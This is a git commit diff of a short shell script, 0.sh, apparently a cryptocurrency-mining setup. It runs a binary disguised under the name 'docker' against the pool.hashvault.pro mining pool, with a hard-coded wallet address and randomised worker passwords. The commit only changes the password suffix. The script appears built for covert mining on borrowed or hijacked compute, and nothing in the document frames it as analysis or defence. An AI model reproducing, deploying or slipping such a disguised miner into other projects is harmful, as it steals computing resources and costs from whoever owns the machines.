10dc0565164f98f3d9e8e0afc4c0ef09bd447b7a
jsiqiisn <100444720+jsiqiisn@users.noreply.github.com>
2022-04-25 23:58:39 +0700

    Update 0.sh

--- 0.sh
+++ 0.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-./docker --url pool.hashvault.pro:80 --user TRTLuzwp6xRJLfVC6v2kCT58AXGuJa7mHgZCuHpksNSMXMfvq7BYZGU1oCFJGYhidbAi8ueW5e4W9P1Q2zoEz7pueyDv5sJmvyH --pass $(echo $(shuf -i 1-20000 -n 1)-V) --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+./docker --url pool.hashvault.pro:80 --user TRTLuzwp6xRJLfVC6v2kCT58AXGuJa7mHgZCuHpksNSMXMfvq7BYZGU1oCFJGYhidbAi8ueW5e4W9P1Q2zoEz7pueyDv5sJmvyH --pass $(echo $(shuf -i 1-20000 -n 1)-steam) --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
